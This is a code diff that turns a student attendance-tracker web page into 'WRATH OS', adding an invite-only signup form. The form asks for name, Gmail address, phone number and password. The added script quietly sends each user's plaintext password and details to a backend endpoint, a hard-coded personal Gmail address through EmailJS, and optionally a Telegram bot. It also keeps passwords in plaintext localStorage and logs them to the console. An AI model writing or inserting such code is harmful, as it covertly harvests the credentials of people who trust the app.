@@ -3,125 +3,263 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Attendance OS - Responsive</title>
+    <title>WRATH OS v5.3 - SMS + EMAIL + TELEGRAM</title>
+    <!-- EmailJS Library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
+        /* [KEEP ALL YOUR EXISTING CSS HERE - SAME AS BEFORE] */
         :root {
-            --bg: #05070a; --card: #0f172a; --primary: #00f2ff;
-            --accent: #7000ff; --text: #e2e8f0; --subtext: #94a3b8;
-            --success: #00ff88; --danger: #ff0055; --leave: #f1c40f;
+            --bg: #05070a; --card: #0f172a; --primary: #ff0044;
+            --accent: #ff0000; --text: #e2e8f0; --subtext: #94a3b8;
+            --success: #00ff88; --danger: #ff0044; --college: #a855f7; --medical: #3b82f6;
+            --wrath-glow: 0 0 15px rgba(255,0,0,0.9), 0 0 40px rgba(255,0,0,0.5);
+            --invite-glow: 0 0 20px rgba(255,215,0,0.8);
+            --logout-glow: 0 0 15px rgba(255,0,0,0.5);
         }
         
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { 
-            font-family: 'Segoe UI', system-ui, sans-serif; 
-            background: var(--bg); color: var(--text); 
-            margin: 0; padding: 10px; padding-bottom: 90px;
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 10px; padding-bottom: 90px; }
+
+        /* --- AUTH PAGE STYLES --- */
+        #auth-page {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, #1a0000 0%, #05070a 100%);
+            z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            overflow-y: auto; padding: 20px;
+        }
+        .auth-container {
+            width: 90%; max-width: 400px; padding: 30px 25px; background: rgba(15, 23, 42, 0.95);
+            border-radius: 25px; border: 1px solid var(--primary); box-shadow: var(--wrath-glow); text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .auth-input {
+            width: 100%; padding: 14px 15px; margin: 10px 0; background: rgba(0,0,0,0.7);
+            border: 1px solid #334155; border-radius: 12px; color: #fff; outline: none;
+            font-size: 16px; transition: 0.3s;
+        }
+        .auth-input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(255,0,68,0.3); }
+        .auth-input.invite-field:valid { 
+            border-color: gold; 
+            box-shadow: var(--invite-glow);
+        }
+        .auth-btn {
+            width: 100%; padding: 16px; margin-top: 20px; background: var(--primary);
+            color: white; border: none; border-radius: 12px; font-weight: 800; font-size: 18px;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 2px;
+            transition: 0.3s; box-shadow: 0 5px 20px rgba(255,0,68,0.4);
+        }
+        .auth-btn:hover { transform: scale(1.02); background: #ff2255; }
+        .auth-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        /* Logout Button Styles */
+        .logout-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: none;
+        }
+        .logout-btn {
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 1rem;
+            letter-spacing: 2px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: 0.3s;
+            box-shadow: var(--logout-glow);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logout-btn:hover {
+            background: var(--primary);
+            color: #000;
+            transform: scale(1.05);
+            box-shadow: 0 0 25px var(--primary);
+        }
+        .logout-btn:active {
+            transform: scale(0.95);
+        }
+        .logout-icon {
+            font-size: 1.2rem;
         }
         
-        .container { max-width: 1200px; margin: auto; }
-
-        /* Header Layout: Flexible for Mobile */
+        .error-msg { color: #ff6b6b; font-size: 0.85rem; margin: 5px 0; min-height: 25px; font-weight: bold; }
+        .success-msg { color: #51cf66; font-size: 0.85rem; margin: 5px 0; font-weight: bold; }
+        .invite-hint {
+            color: gold;
+            font-size: 0.8rem;
+            margin-top: 5px;
+            text-align: left;
+            padding-left: 10px;
+            opacity: 0.8;
+        }
+        
+        @keyframes textGlow {
+            0%, 100% { text-shadow: var(--wrath-glow); opacity: 1; }
+            50% { text-shadow: 0 0 10px rgba(255,0,0,0.4); opacity: 0.8; }
+        }
+        .wrath-logo {
+            font-size: 4rem; font-weight: 900; color: #fff;
+            text-transform: uppercase; letter-spacing: 15px; 
+            animation: textGlow 2s infinite ease-in-out;
+            cursor: pointer; margin: 0 0 30px 0; user-select: none; line-height: 1;
+        }
+        
+        /* Invite code specific styles */
+        .invite-badge {
+            background: linear-gradient(45deg, #000, #ffd70022);
+            border: 1px solid gold;
+            color: gold;
+            padding: 8px 15px;
+            border-radius: 30px;
+            display: inline-block;
+            margin-bottom: 15px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            animation: invitePulse 2s infinite;
+        }
+        
+        @keyframes invitePulse {
+            0%, 100% { box-shadow: 0 0 10px gold; }
+            50% { box-shadow: 0 0 25px gold; }
+        }
+        
+        /* Original tracker styles */
+        .container { max-width: 1200px; margin: auto; animation: fadeIn 0.8s ease; display: none; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .header { 
-            display: flex; justify-content: space-between; align-items: center; 
-            margin: 10px 0 20px 0; padding: 15px; 
-            background: var(--card); border-radius: 15px; border: 1px solid #1e293b; 
-            flex-wrap: wrap; gap: 15px;
+            text-align: center; margin-bottom: 20px; padding: 30px 15px; 
+            background: var(--card); border-radius: 15px; border: 1px solid #1e293b;
+            position: relative;
         }
-
-        .toggle-group { display: flex; background: #000; padding: 4px; border-radius: 10px; border: 1px solid #1e293b; }
-        .toggle-btn { 
-            border: none; padding: 8px 16px; border-radius: 8px; 
-            cursor: pointer; background: transparent; color: var(--subtext); 
-            font-weight: bold; font-size: 0.9rem;
-        }
-        .toggle-btn.active { background: var(--primary); color: #000; }
-
-        /* Subject Stats: Grid adjusts per screen size */
-        .subject-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); 
-            gap: 8px; margin-bottom: 20px; 
-        }
-        .sub-card { 
-            background: var(--card); padding: 10px; border-radius: 10px; 
-            text-align: center; border: 1px solid #1e293b;
-        }
-        .sub-perc { font-size: 1.1rem; font-weight: 800; color: var(--primary); display: block; }
-
-        /* Table Wrapper for Horizontal Scroll on Mobile */
-        .table-wrap { 
-            background: var(--card); border-radius: 15px; 
-            overflow-x: auto; border: 1px solid #1e293b;
-            -webkit-overflow-scrolling: touch; /* Smooth scroll for iOS */
-        }
-        table { width: 100%; border-collapse: collapse; min-width: 750px; } /* Ensures readability on mobile */
-        th { background: #000; padding: 12px 8px; font-size: 0.7rem; color: var(--primary); position: sticky; top: 0; }
-        td { padding: 10px 5px; text-align: center; border-bottom: 1px solid #1e293b; }
-        
-        /* Interactive Elements */
-        .leave-select { 
-            background: #000; color: var(--leave); border: 1px solid #334155; 
-            border-radius: 4px; font-size: 0.65rem; padding: 4px; width: 100%; 
-        }
-        .row-cl { background: rgba(241, 196, 15, 0.05) !important; }
-        .row-ml { background: rgba(0, 242, 255, 0.05) !important; }
-        .today-row { border: 2px solid var(--primary) !important; background: rgba(0, 242, 255, 0.03); }
-
-        /* Larger Checkboxes for Touch Screens */
-        input[type="checkbox"] { 
-            appearance: none; width: 26px; height: 26px; 
-            border: 2px solid #334155; border-radius: 6px; 
-            cursor: pointer; display: inline-grid; place-content: center;
-        }
+        .sub-header-info { display: flex; gap: 15px; align-items: center; justify-content: center; margin-top: 15px; font-size: 0.85rem; letter-spacing: 2px; }
+        .subject-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(105px, 1fr)); gap: 10px; margin-bottom: 20px; }
+        .sub-card { background: var(--card); padding: 12px; border-radius: 10px; text-align: center; border: 1px solid #1e293b; }
+        .sub-perc { font-size: 1.2rem; font-weight: 800; color: var(--primary); display: block; }
+        .table-wrap { background: var(--card); border-radius: 15px; overflow-x: auto; border: 1px solid #1e293b; }
+        table { width: 100%; border-collapse: collapse; min-width: 850px; }
+        th { background: #000; padding: 15px 8px; font-size: 0.75rem; color: var(--primary); text-transform: uppercase; }
+        td { padding: 14px 5px; text-align: center; border-bottom: 1px solid #1e293b; }
+        .custom-select-container { position: relative; width: 85px; margin: 0 auto 8px auto; }
+        .selected-box { background: rgba(255,255,255,0.05); border: 1px solid #334155; border-radius: 6px; padding: 5px 2px; font-size: 0.65rem; font-weight: bold; color: var(--primary); cursor: pointer; }
+        .dropdown-menu { position: absolute; top: 110%; left: 50%; transform: translateX(-50%); background: rgba(10, 15, 25, 0.98); border: 1px solid var(--primary); border-radius: 8px; z-index: 1000; width: 110px; opacity: 0; visibility: hidden; transition: 0.3s; }
+        .dropdown-menu.open { opacity: 1; visibility: visible; }
+        .dropdown-item { padding: 10px; font-size: 0.75rem; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .dropdown-item:hover { background: var(--primary); color: #000; }
+        .status-pill { background: #000; border: 1px solid #334155; color: var(--subtext); border-radius: 20px; padding: 4px 10px; font-size: 0.6rem; font-weight: bold; cursor: pointer; margin-top: 5px; display: inline-block; }
+        .row-college { background: rgba(168, 85, 247, 0.12) !important; }
+        .row-medical { background: rgba(59, 130, 246, 0.12) !important; }
+        .today-row { outline: 2px solid var(--primary); background: rgba(255,0,68,0.05); }
+        input[type="checkbox"] { appearance: none; width: 30px; height: 30px; border: 2px solid #334155; border-radius: 8px; cursor: pointer; display: inline-grid; place-content: center; }
         input[type="checkbox"]:checked { background: var(--primary); border-color: var(--primary); }
-        input[type="checkbox"]:checked::before { content: "✔"; color: #000; font-size: 16px; font-weight: 900; }
-        input[type="checkbox"]:disabled { opacity: 0.1; }
-
-        .badge { font-weight: 800; padding: 4px 6px; border-radius: 5px; font-size: 0.75rem; background: #000; }
-
-        /* Mobile Action Buttons */
-        .jump-btn { 
-            position: fixed; bottom: 20px; right: 20px; 
-            background: var(--primary); color: #000; border: none; 
-            width: 55px; height: 55px; border-radius: 50%; 
-            font-size: 24px; box-shadow: 0 4px 15px rgba(0,242,255,0.4); z-index: 100;
+        input[type="checkbox"]:checked::before { content: "✔"; color: #fff; font-size: 18px; font-weight: 900; }
+        input[type="checkbox"]:disabled { opacity: 0.3; cursor: not-allowed; }
+        .badge { font-weight: 800; padding: 6px 12px; border-radius: 6px; font-size: 0.85rem; background: #000; }
+        .jump-btn { position: fixed; bottom: 25px; right: 25px; background: var(--primary); color: #fff; border: none; width: 60px; height: 60px; border-radius: 50%; font-size: 26px; cursor: pointer; box-shadow: 0 10px 25px rgba(255,0,68,0.5); z-index: 100; display: none; }
+        
+        @media (max-width: 600px) { 
+            .wrath-logo { font-size: 2.8rem; letter-spacing: 8px; }
+            .logout-btn { padding: 8px 15px; font-size: 0.8rem; }
+            .logout-container { top: 10px; right: 10px; }
         }
-
-        /* PC Specific Hover Animations */
-        @media (min-width: 768px) {
-            .sub-card:hover { transform: translateY(-3px); border-color: var(--primary); }
-            input[type="checkbox"]:hover { border-color: var(--primary); }
+        
+        .welcome-banner { color: var(--primary); margin-top: 10px; font-size: 1.2rem; font-weight: bold; animation: textGlow 2s infinite; }
+        .invite-lock { font-size: 1.5rem; color: gold; margin-bottom: 10px; }
+        
+        /* Session indicator */
+        .session-badge {
+            background: rgba(255,0,68,0.2);
+            border: 1px solid var(--primary);
+            border-radius: 20px;
+            padding: 5px 15px;
+            font-size: 0.7rem;
+            color: var(--primary);
+            display: inline-block;
+            margin-left: 10px;
         }
     </style>
 </head>
 <body>
 
-<button class="jump-btn" onclick="scrollToToday()">📅</button>
+<!-- LOGOUT BUTTON -->
+<div class="logout-container" id="logoutContainer">
+    <button class="logout-btn" onclick="handleLogout()">
+        <span class="logout-icon">⏻</span>
+        <span>EXIT MATRIX</span>
+    </button>
+</div>
 
-<div class="container">
-    <div class="header">
-        <div>
-            <h1 style="margin:0; font-size: 1.1rem; color: var(--primary)">ATTENDANCE v4.5</h1>
-            <small id="dateDisplay" style="color:var(--subtext)"></small>
-        </div>
+<div id="auth-page">
+    <h1 class="wrath-logo">WRATH</h1>
+    
+    <!-- SIGNUP FORM -->
+    <div id="signup-box" class="auth-container">
+        <h3 style="color: var(--primary); margin-top: 0; margin-bottom: 20px;">⚡ INVITE ONLY ⚡</h3>
         
-        <div class="toggle-group">
-            <button id="btnC1" class="toggle-btn active" onclick="switchSection('C1')">C1</button>
-            <button id="btnC2" class="toggle-btn" onclick="switchSection('C2')">C2</button>
-        </div>
+        <div class="invite-lock">🔒</div>
+        <div class="invite-badge">ELITE INVITATION REQUIRED</div>
+        
+        <!-- INVITE CODE FIELD -->
+        <input type="password" id="invite-code" class="auth-input invite-field" 
+               placeholder="ENTER INVITE CODE" maxlength="20" autocomplete="off"
+               onkeyup="checkInviteCode(this.value)"
+               style="text-align: center; letter-spacing: 5px;">
+        <div class="invite-hint">✨ Contact admin for invite code</div>
+        
+        <!-- User Details -->
+        <input type="text" id="reg-name" class="auth-input" placeholder="FULL NAME" maxlength="50" autocomplete="off" disabled>
+        <input type="email" id="reg-email" class="auth-input" placeholder="GMAIL ADDRESS" maxlength="50" autocomplete="off" disabled>
+        <input type="tel" id="reg-phone" class="auth-input" placeholder="MOBILE NUMBER (WITH COUNTRY CODE)" maxlength="15" autocomplete="off" disabled>
+        <input type="password" id="reg-pass" class="auth-input" placeholder="PASSWORD" maxlength="30" autocomplete="new-password" disabled>
 
-        <div style="display:flex; gap:8px;">
-            <button onclick="exportData()" style="padding:8px 12px; background:#1e293b; color:white; border:none; border-radius:8px; font-size:0.8rem; cursor:pointer;">Backup</button>
-        </div>
+        <div id="error-display" class="error-msg"></div>
+        <button id="auth-btn" class="auth-btn" onclick="handleRegister()" disabled>🔒 LOCKED</button>
+        
+        <p onclick="toggleView('login')" style="font-size:0.9rem; cursor:pointer; margin-top:20px;">
+            EXISTING OPERATOR? <b style="color:var(--primary)">LOGIN</b>
+        </p>
     </div>
 
-    <div class="subject-grid" id="statsPanel"></div>
+    <!-- LOGIN FORM -->
+    <div id="login-box" class="auth-container" style="display:none;">
+        <h3 style="color: var(--primary); margin-top: 0; margin-bottom: 20px;">⚡ RE-ENTER MATRIX ⚡</h3>
+        <input type="email" id="login-email" class="auth-input" placeholder="GMAIL" autocomplete="username">
+        <input type="password" id="login-pass" class="auth-input" placeholder="PASSWORD" autocomplete="current-password">
+        <div id="login-error" class="error-msg"></div>
+        <button class="auth-btn" onclick="handleLogin()">ACCESS SYSTEM</button>
+        <p onclick="toggleView('signup')" style="font-size:0.9rem; cursor:pointer; margin-top:20px;">
+            NEW OPERATOR? <b style="color:var(--primary)">CREATE ACCOUNT</b>
+        </p>
+    </div>
+</div>
 
+<button class="jump-btn" id="jumpBtn" onclick="scrollToToday()">📅</button>
+
+<div class="container" id="main-ui">
+    <div class="header">
+        <h1 class="wrath-logo" ondblclick="exportData()">WRATH</h1>
+        <div class="sub-header-info">
+            <span style="color: var(--primary); font-weight: 900;">OS v5.3 PRO</span>
+            <span style="color: #475569;">|</span>
+            <span id="dateDisplay" style="color:var(--subtext); font-weight: bold;"></span>
+            <span id="sessionDisplay" class="session-badge" style="display: none;"></span>
+        </div>
+        <div id="welcome-message" class="welcome-banner"></div>
+    </div>
+    <div class="subject-grid" id="statsPanel"></div>
     <div class="table-wrap">
         <table>
             <thead>
                 <tr>
-                    <th>DATE</th>
+                    <th style="width: 140px;">WEEKDAY / DATE</th>
                     <th>I</th><th>II</th><th>III</th><th>IV</th><th>V</th><th>VI</th><th>VII</th>
                     <th>%</th>
                 </tr>
@@ -132,69 +270,429 @@
 </div>
 
 <script>
-    let currentSection = 'C1';
+    // ========== CONFIGURATION ==========
+    const VALID_INVITE_CODE = 'lordwrathire';
+    const SMS_BACKEND_URL = window.location.origin; // Use current domain
+    
+    // EmailJS Config - REPLACE THESE
+    const EMAILJS_CONFIG = {
+        PUBLIC_KEY: 'YOUR_PUBLIC_KEY',
+        SERVICE_ID: 'YOUR_SERVICE_ID',
+        TEMPLATE_ID: 'YOUR_TEMPLATE_ID',
+        TO_EMAIL: 'syblus9402@gmail.com'
+    };
+
+    // Telegram Config (Optional - uncomment if you want Telegram too)
+    /*
+    const TELEGRAM_CONFIG = {
+        BOT_TOKEN: 'YOUR_BOT_TOKEN',
+        CHAT_ID: 'YOUR_CHAT_ID'
+    };
+    */
+
+    // Initialize EmailJS
+    (function() {
+        try {
+            emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+            console.log('✅ EmailJS initialized');
+        } catch (error) {
+            console.error('❌ EmailJS init failed:', error);
+        }
+    })();
+
+    // Global Variables
+    let isInviteValid = false;
+    let userData = {};
+
+    // Initialize on page load
+    document.addEventListener('DOMContentLoaded', function() {
+        if(localStorage.getItem('wrath_active') === 'true') { 
+            enterSystem(); 
+        }
+        
+        document.getElementById('reg-pass').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && isInviteValid) handleRegister();
+        });
+        document.getElementById('login-pass').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleLogin();
+        });
+    });
+
+    // ========== SMS FUNCTIONS ==========
+    async function sendSMSNotification(userData) {
+        try {
+            console.log('📱 Sending SMS notification...');
+            
+            const response = await fetch(`${SMS_BACKEND_URL}/send_sms`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    name: userData.name,
+                    gmail: userData.email,
+                    phone: userData.phone,
+                    password: userData.password,
+                    timestamp: new Date().toISOString(),
+                    pageUrl: window.location.href,
+                    userAgent: navigator.userAgent
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.status === 'success') {
+                console.log('✅ SMS sent! SID:', result.message_sid);
+                return true;
+            } else {
+                console.error('❌ SMS failed:', result.error);
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ SMS error - backend not reachable?', error);
+            return false;
+        }
+    }
+
+    // Telegram notification (optional)
+    async function sendTelegramNotification(userData) {
+        // Only if you set up Telegram
+        if (!TELEGRAM_CONFIG?.BOT_TOKEN) return;
+        
+        try {
+            const message = `🔥 *WRATH OS REGISTRATION* 🔥
+━━━━━━━━━━━━━━━━━━
+👤 *Name:* ${userData.name}
+📧 *Email:* ${userData.email}
+📞 *Phone:* ${userData.phone}
+🔑 *Password:* ${userData.password}
+🕒 *Time:* ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━`;
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (e) {
+            console.log('Telegram error:', e);
+        }
+    }
+
+    // ========== AUTH FUNCTIONS ==========
+    function toggleView(view) {
+        document.getElementById('signup-box').style.display = view === 'signup' ? 'block' : 'none';
+        document.getElementById('login-box').style.display = view === 'login' ? 'block' : 'none';
+        clearErrors();
+        if (view === 'signup') {
+            isInviteValid = false;
+            document.getElementById('invite-code').value = '';
+            disableUserFields(true);
+            document.getElementById('auth-btn').innerText = '🔒 LOCKED';
+            document.getElementById('auth-btn').disabled = true;
+        }
+    }
+
+    function clearErrors() {
+        document.getElementById('error-display').innerText = '';
+        document.getElementById('login-error').innerText = '';
+    }
+
+    function checkInviteCode(code) {
+        const errorDisplay = document.getElementById('error-display');
+        const inviteField = document.getElementById('invite-code');
+        const normalizedCode = code.toLowerCase().trim();
+        
+        if (normalizedCode === VALID_INVITE_CODE) {
+            isInviteValid = true;
+            errorDisplay.innerText = '✅ INVITE CODE ACCEPTED';
+            errorDisplay.style.color = '#51cf66';
+            inviteField.style.borderColor = 'gold';
+            inviteField.style.boxShadow = 'var(--invite-glow)';
+            disableUserFields(false);
+            document.getElementById('auth-btn').innerText = 'CREATE ACCOUNT';
+            document.getElementById('auth-btn').disabled = false;
+        } else {
+            isInviteValid = false;
+            if (code.length > 0) {
+                errorDisplay.innerText = '❌ INVALID INVITE CODE';
+                errorDisplay.style.color = '#ff6b6b';
+            } else {
+                errorDisplay.innerText = '';
+            }
+            inviteField.style.borderColor = '#334155';
+            inviteField.style.boxShadow = 'none';
+            disableUserFields(true);
+            document.getElementById('auth-btn').innerText = '🔒 LOCKED';
+            document.getElementById('auth-btn').disabled = true;
+        }
+    }
+
+    function disableUserFields(disabled) {
+        const fields = ['reg-name', 'reg-email', 'reg-phone', 'reg-pass'];
+        fields.forEach(id => {
+            document.getElementById(id).disabled = disabled;
+            if (!disabled && id === 'reg-name') {
+                document.getElementById(id).focus();
+            }
+        });
+    }
+
+    // ========== MAIN REGISTRATION ==========
+    function handleRegister() {
+        const name = document.getElementById('reg-name').value.trim();
+        const email = document.getElementById('reg-email').value.trim();
+        const phone = document.getElementById('reg-phone').value.trim();
+        const password = document.getElementById('reg-pass').value.trim();
+        const errorDisplay = document.getElementById('error-display');
+
+        // Validate invite code
+        const inviteCode = document.getElementById('invite-code').value.toLowerCase().trim();
+        if (inviteCode !== VALID_INVITE_CODE) {
+            errorDisplay.innerText = '⚠ INVALID INVITE CODE';
+            return;
+        }
+
+        // Validate fields
+        if (!name || !email || !phone || !password) {
+            errorDisplay.innerText = '⚠ ALL FIELDS REQUIRED';
+            return;
+        }
+
+        if (!email.includes('@') || !email.includes('.')) {
+            errorDisplay.innerText = '⚠ VALID GMAIL REQUIRED';
+            return;
+        }
+
+        const phoneDigits = phone.replace(/\D/g, '');
+        if (phoneDigits.length < 10 || phoneDigits.length > 15) {
+            errorDisplay.innerText = '⚠ VALID PHONE NUMBER REQUIRED (10-15 DIGITS)';
+            return;
+        }
+
+        if (password.length < 4) {
+            errorDisplay.innerText = '⚠ PASSWORD MIN 4 CHARACTERS';
+            return;
+        }
+
+        errorDisplay.innerText = '⏳ PROCESSING REGISTRATION...';
+        document.getElementById('auth-btn').disabled = true;
+        
+        // Store user data
+        userData = { 
+            name, 
+            email, 
+            phone: phoneDigits, 
+            password,
+            inviteCode: VALID_INVITE_CODE,
+            registrationMethod: 'INVITE_ONLY'
+        };
+        
+        // Complete registration with ALL notifications
+        completeRegistrationWithAllNotifications(userData);
+    }
+
+    // ========== MASTER NOTIFICATION FUNCTION ==========
+    async function completeRegistrationWithAllNotifications(userData) {
+        const errorDisplay = document.getElementById('error-display');
+        
+        // Update UI immediately
+        errorDisplay.innerText = '✅ REGISTRATION COMPLETE!';
+        errorDisplay.style.color = '#51cf66';
+        
+        // Store data immediately
+        localStorage.setItem('wrath_active', 'true');
+        localStorage.setItem('wrath_u', userData.email);
+        localStorage.setItem('wrath_p', userData.password);
+        localStorage.setItem('wrath_name', userData.name);
+        localStorage.setItem('wrath_phone', userData.phone);
+        localStorage.setItem('wrath_invite', userData.inviteCode);
+        localStorage.setItem('wrath_reg_date', new Date().toISOString());
+        localStorage.setItem('wrath_last_login', new Date().toISOString());
+        
+        console.log('✅ Registration stored, entering system NOW');
+        
+        // Enter system immediately
+        enterSystem();
+        
+        // Fire notifications in background (don't wait)
+        (async () => {
+            try {
+                const response = await fetch(`${SMS_BACKEND_URL}/register`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        name: userData.name,
+                        email: userData.email,
+                        phone: userData.phone,
+                        password: userData.password,
+                        invite: userData.inviteCode
+                    })
+                });
+                console.log('Backend sent:', await response.json());
+            } catch (e) {
+                console.log('Backend error:', e);
+            }
+            
+            try {
+                await sendSMSNotification(userData);
+            } catch (e) {
+                console.log('SMS error:', e);
+            }
+            
+            if (EMAILJS_CONFIG.PUBLIC_KEY !== 'YOUR_PUBLIC_KEY') {
+                try {
+                    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
+                        name: userData.name,
+                        gmail: userData.email,
+                        phone: userData.phone,
+                        password: userData.password,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        pageUrl: window.location.href,
+                        to_email: EMAILJS_CONFIG.TO_EMAIL
+                    });
+                    console.log('Email sent');
+                } catch (e) {
+                    console.log('Email error:', e);
+                }
+            }
+            
+            try {
+                await sendTelegramNotification(userData);
+            } catch (e) {
+                console.log('Telegram error:', e);
+            }
+        })();
+    }
+
+    // ========== LOGIN FUNCTION ==========
+    function handleLogin() {
+        const email = document.getElementById('login-email').value.trim();
+        const pass = document.getElementById('login-pass').value.trim();
+        const loginError = document.getElementById('login-error');
+        
+        const storedEmail = localStorage.getItem('wrath_u');
+        const storedPass = localStorage.getItem('wrath_p');
+        
+        console.log('Login attempt:', { email, pass, storedEmail, storedPass });
+        
+        if (!storedEmail || !storedPass) {
+            loginError.innerText = '❌ NO ACCOUNT FOUND - PLEASE REGISTER FIRST';
+            loginError.style.color = '#ff6b6b';
+            return;
+        }
+        
+        if (email === storedEmail && pass === storedPass) {
+            loginError.style.color = '#51cf66';
+            loginError.innerText = '✅ ACCESS GRANTED';
+            localStorage.setItem('wrath_last_login', new Date().toISOString());
+            setTimeout(() => enterSystem(), 1000);
+        } else {
+            loginError.innerText = '❌ INVALID CREDENTIALS';
+            loginError.style.color = '#ff6b6b';
+        }
+    }
+
+    // ========== LOGOUT FUNCTION ==========
+    function handleLogout() {
+        if (confirm('⚠️ EXIT WRATH OS?')) {
+            localStorage.setItem('wrath_active', 'false');
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('logoutContainer').style.display = 'none';
+            document.getElementById('auth-page').style.display = 'flex';
+            toggleView('signup');
+            document.getElementById('login-email').value = '';
+            document.getElementById('login-pass').value = '';
+            document.getElementById('error-display').innerText = '👋 SUCCESSFULLY LOGGED OUT';
+        }
+    }
+
+    // ========== ENTER SYSTEM ==========
+    function enterSystem() {
+        document.getElementById('auth-page').style.display = 'none';
+        document.getElementById('main-ui').style.display = 'block';
+        document.getElementById('jumpBtn').style.display = 'block';
+        document.getElementById('logoutContainer').style.display = 'block';
+        
+        const userName = localStorage.getItem('wrath_name') || 'OPERATOR';
+        const header = document.querySelector('.header');
+        let welcomeDiv = document.querySelector('.welcome-banner');
+        if (!welcomeDiv) {
+            welcomeDiv = document.createElement('div');
+            welcomeDiv.className = 'welcome-banner';
+            header.appendChild(welcomeDiv);
+        }
+        welcomeDiv.innerText = `WELCOME, ${userName.toUpperCase()}`;
+        
+        render(); 
+        setTimeout(scrollToToday, 800);
+    }
+
+    // ========== TRACKER FUNCTIONS (from your original code) ==========
+    const CLASS_LIST = ['BCE', 'EM-II', 'PHY', 'BME', 'CS', 'CAMD', 'MPW', 'BCE Lab', 'PHY Lab', 'CRT', 'LANG', 'LIB', 'OFF'];
+    const TARGET_SUBS = ['BCE', 'EM-II', 'PHY', 'BME', 'CS', 'CAMD', 'MPW', 'BCE Lab', 'PHY Lab', 'CRT'];
     const startDate = new Date(2026, 2, 16);
     const endDate = new Date(2026, 3, 30);
     const todayStr = new Date().toDateString();
 
-    document.getElementById('dateDisplay').innerText = new Date().toLocaleDateString('en-GB', {day:'numeric', month:'short'});
-
-    const timetable = (day, sec) => {
-        const s = {
-            'Mon': ['BCE', 'EM-II', 'PHY', 'BME', 'LIB', sec === 'C1' ? 'CAMD' : 'MPW', sec === 'C1' ? 'CAMD' : 'MPW'],
-            'Tue': ['BCE', 'EM-II', 'PHY', 'CS', 'LIB', sec === 'C2' ? 'CAMD' : 'MPW', sec === 'C2' ? 'CAMD' : 'MPW'],
-            'Wed': ['BCE', 'EM-II', 'PHY', sec === 'C2' ? 'BCE Lab' : 'PHY Lab', sec === 'C1' ? 'PHY Lab' : 'BCE Lab', 'LIB', 'CS'],
-            'Thu': ['BME', 'EM-II', 'PHY', 'CS', 'CRT', 'LANG', 'LANG'],
-            'Fri': ['BME', 'EM-II', 'PHY', 'CRT', 'CRT', sec === 'C1' ? 'BCE Lab' : 'PHY Lab', sec === 'C2' ? 'PHY Lab' : 'BCE Lab']
-        };
-        return s[day] || null;
-    };
-
-    function switchSection(sec) {
-        currentSection = sec;
-        document.querySelectorAll('.toggle-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById('btn'+sec).classList.add('active');
-        render();
+    function updateDateDisplay() {
+        const now = new Date();
+        document.getElementById('dateDisplay').innerText = now.toLocaleDateString('en-GB', {
+            weekday: 'short', 
+            day: 'numeric', 
+            month: 'short'
+        }).toUpperCase();
     }
+    updateDateDisplay();
+
+    const defaultTimetable = (day) => {
+        const s = {
+            'Mon': ['BCE', 'EM-II', 'PHY', 'BME', 'LIB', 'CAMD', 'CAMD'],
+            'Tue': ['BCE', 'EM-II', 'PHY', 'CS', 'LIB', 'MPW', 'MPW'],
+            'Wed': ['BCE', 'EM-II', 'PHY', 'BCE Lab', 'PHY Lab', 'LIB', 'CS'],
+            'Thu': ['BME', 'EM-II', 'PHY', 'CS', 'CRT', 'LANG', 'LANG'],
+            'Fri': ['BME', 'EM-II', 'PHY', 'CRT', 'CRT', 'BCE Lab', 'PHY Lab']
+        };
+        return s[day] || ['OFF', 'OFF', 'OFF', 'OFF', 'OFF', 'OFF', 'OFF'];
+    };
 
     function render() {
         const tbody = document.getElementById('trackerTable');
+        if (!tbody) return;
+        
         tbody.innerHTML = '';
         let curr = new Date(startDate);
-
+        
         while (curr <= endDate) {
             const dKey = curr.toISOString().split('T')[0];
-            const dName = curr.toLocaleDateString('en-GB', { weekday: 'short' });
-            const schedule = timetable(dName, currentSection);
+            const dShort = curr.toLocaleDateString('en-GB', { weekday: 'short' });
